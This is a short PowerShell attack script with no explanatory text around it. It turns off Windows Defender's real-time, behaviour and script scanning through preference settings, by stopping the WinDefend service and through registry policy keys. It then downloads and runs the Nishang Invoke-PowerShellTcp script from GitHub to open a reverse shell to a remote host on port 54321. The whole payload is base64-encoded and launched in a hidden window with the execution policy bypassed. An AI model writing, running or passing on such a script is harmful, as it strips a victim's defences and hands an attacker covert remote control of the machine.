# Base64 encoded commands to disable Windows Defender and execute reverse shell
$commands = @'
# Disable Windows Defender real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisablePrivacyMode $true
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScriptScanning $true

# Disable Defender services
Stop-Service -Name WinDefend -Force
Set-Service -Name WinDefend -StartupType Disabled

# Disable Defender through registry
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d 1 /f

# Download and execute Nishang reverse shell
IEX (IWR https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -UseBasicParsing)
Invoke-PowerShellTcp -Reverse -IPAddress desktop-pqf78il.tail7f62d3.ts.net -Port 54321
'@

# Convert to base64
$encodedCommands = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($commands))

# Execute the base64 encoded commands
powershell -ep bypass -w hidden -encodedCommand $encodedCommands
